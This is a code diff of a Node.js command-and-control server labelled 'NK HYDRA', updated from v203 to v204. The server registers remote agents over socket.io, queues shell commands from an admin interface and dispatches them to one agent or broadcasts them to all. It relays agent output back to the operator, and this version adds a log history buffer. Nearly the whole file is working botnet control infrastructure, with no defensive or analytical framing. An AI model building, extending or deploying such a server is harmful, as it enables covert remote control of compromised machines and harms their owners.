@@ -1,5 +1,5 @@
 // TYPE: NODE.JS C2 SERVER
-// NK HYDRA v203.0 [DISPATCH CONFIRMATION]
+// NK HYDRA v204.0 [HISTORY BUFFER & LOG SYNC]
 
 const express = require('express');
 const http = require('http');
@@ -9,37 +9,38 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-// Health Check
 app.get('/health', (req, res) => { res.status(200).send('OK'); });
 app.get('/', (req, res) => { 
-    res.json({ status: 'online', version: 'v203.0', agents: agents.length }); 
+    res.json({ status: 'online', version: 'v204.0', agents: agents.length }); 
 });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingInterval: 10000, 
-    pingTimeout: 40000, 
+    pingInterval: 5000, 
+    pingTimeout: 10000, // Short timeout to detect disconnects fast
     maxHttpBufferSize: 1e8, 
     transports: ['polling', 'websocket'] 
 });
 
 let agents = []; 
 const commandQueue = [];
-let adminSocket = null; 
-const activeCommands = new Map();
+const eventHistory = []; // CIRCULAR BUFFER FOR LOGS
+const MAX_HISTORY = 100;
 
-const logToAdmin = (level, message, details = {}) => {
-    if (adminSocket) {
-        adminSocket.emit('agent_event', {
-            type: 'TELEMETRY',
-            agentId: 'C2_KERNEL',
-            payload: { timestamp: Date.now(), source: 'C2', level, message, details }
-        });
-    }
-    console.log(`[${level}] ${message}`);
+// Log helper that broadcasts AND saves to history
+const broadcastLog = (type, payload) => {
+    const event = { type, payload, timestamp: Date.now() };
+    
+    // Save to history
+    eventHistory.push(event);
+    if (eventHistory.length > MAX_HISTORY) eventHistory.shift();
+    
+    // Broadcast to UI Room
+    io.to('ui_room').emit('agent_event', event);
 };
 
+// Queue Processor
 let isProcessingQueue = false;
 const processQueue = async () => {
     if (isProcessingQueue || commandQueue.length === 0) return;
@@ -51,22 +52,18 @@ const processQueue = async () => {
             try {
                 if (task.targetId === 'all') {
                     io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
-                    logToAdmin('INFO', 'Broadcast Sent', { cmd: task.cmd });
+                    broadcastLog('INFO', { source: 'C2', message: 'Broadcast Sent', cmd: task.cmd });
                 } else {
                     const agent = agents.find(a => a.id === task.targetId);
                     if (agent && agent.socketId) {
-                         // LOG DISPATCH
-                         logToAdmin('INFO', `Dispatching to ${agent.id}`, { cmd: task.cmd, socketId: agent.socketId });
-                         
                          io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
-                         
-                         activeCommands.set(agent.socketId, { cmd: task.cmd, start: Date.now() });
+                         broadcastLog('INFO', { source: 'C2', message: `Dispatched to ${agent.id}`, cmd: task.cmd });
                     } else {
-                        logToAdmin('WARNING', 'Agent Not Found for Task', { target: task.targetId });
+                        broadcastLog('WARNING', { source: 'C2', message: 'Agent Offline for Task', target: task.targetId });
                     }
                 }
             } catch (e) {
-                logToAdmin('ERROR', 'Queue Failed', { error: e.message });
+                console.error(e);
             }
         }
         await new Promise(r => setTimeout(r, 100)); 
@@ -79,55 +76,53 @@ io.on('connection', (socket) => {
     socket.on('identify', (data) => {
         if (data.type === 'ui') {
             socket.join('ui_room');
-            adminSocket = socket;
+            
+            // SEND STATE DUMP
             socket.emit('agents_list', agents);
-            logToAdmin('SUCCESS', 'Admin UI Connected');
+            socket.emit('history_dump', eventHistory); // CRITICAL: Send past logs
+            
+            broadcastLog('SUCCESS', { source: 'C2_SYS', message: 'UI Admin Connected' });
             return;
         }
         
-        // Remove old instance
+        // Agent Logic
         agents = agents.filter(a => a.id !== data.id);
-        
-        const newAgent = { ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() };
-        agents.push(newAgent);
+        agents.push({ ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() });
         
         io.to('ui_room').emit('agents_list', agents);
-        logToAdmin('SUCCESS', `Agent Online: ${data.id}`, { ip: data.ip });
+        broadcastLog('SUCCESS', { source: 'C2_SYS', message: `Agent Reconnected: ${data.id}` });
         
         if(commandQueue.length > 0) processQueue();
     });
 
     socket.on('exec_cmd', (data) => {
-        logToAdmin('INFO', 'Command Queued via UI', { cmd: data.cmd });
         commandQueue.push({ ...data, id: Date.now().toString() });
         processQueue();
     });
     
+    // RELAY AGENT EVENTS TO UI
     socket.on('agent_event', (data) => {
-        if (data.type === 'SUCCESS' || data.type === 'ERROR') {
-             const agent = agents.find(a => a.id === data.agentId);
-             if (agent) activeCommands.delete(agent.socketId);
-        }
-        io.to('ui_room').emit('agent_event', data);
+        // Data should have { type, payload, agentId }
+        // We wrap it to ensure it goes to history properly
+        const event = { 
+            type: data.type, 
+            agentId: data.agentId || 'UNKNOWN',
+            payload: data.payload,
+            timestamp: Date.now()
+        };
+        
+        eventHistory.push(event);
+        if (eventHistory.length > MAX_HISTORY) eventHistory.shift();
+        
+        io.to('ui_room').emit('agent_event', event);
     });
 
-    socket.on('disconnect', (reason) => {
+    socket.on('disconnect', () => {
         const agent = agents.find(a => a.socketId === socket.id);
         if (agent) { 
             agent.status = 'Offline'; 
             io.to('ui_room').emit('agents_list', agents);
-            
-            const lastCmd = activeCommands.get(socket.id);
-            if (lastCmd) {
-                logToAdmin('CRITICAL', 'AGENT CRASH DETECTED', { 
-                    reason: `Agent disconnected while executing: ${lastCmd.cmd}`,
-                    possible_cause: 'Memory Overflow or Socket Timeout',
-                    recommendation: 'Use output redirection.'
-                });
-                activeCommands.delete(socket.id);
-            }
-        } else if (socket === adminSocket) {
-            adminSocket = null;
+            broadcastLog('WARNING', { source: 'C2_SYS', message: `Agent Dropped: ${agent.id}` });
         }
     });
     
@@ -138,4 +133,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v203 LISTENING ON ${PORT}`));
+server.listen(PORT, () => console.log(`HYDRA v204 LISTENING ON ${PORT}`));
